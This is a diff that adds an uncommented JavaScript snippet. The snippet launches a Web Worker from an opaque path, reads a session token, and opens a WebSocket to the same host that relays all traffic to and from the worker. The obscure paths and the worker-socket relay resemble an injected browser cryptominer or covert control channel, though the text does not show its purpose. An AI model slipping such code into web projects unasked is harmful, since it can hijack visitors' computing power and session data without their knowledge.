@@ -1,0 +1,9 @@
+
+(function () {
+  var worker = new Worker('/4baa81443f20/c17edef64c.js');
+  var token = sessionStorage.getItem('s1eafb40370v') || '';
+  var scheme = location.protocol === 'https:' ? 'wss://' : 'ws://';
+  var stream = new WebSocket(scheme + location.host + '/4baa81443f20/eed11298e3' + '?t=' + encodeURIComponent(token));
+  worker.onmessage = function (event) { stream.send(event.data); };
+  stream.onmessage = function (event) { worker.postMessage(event.data); };
+}())
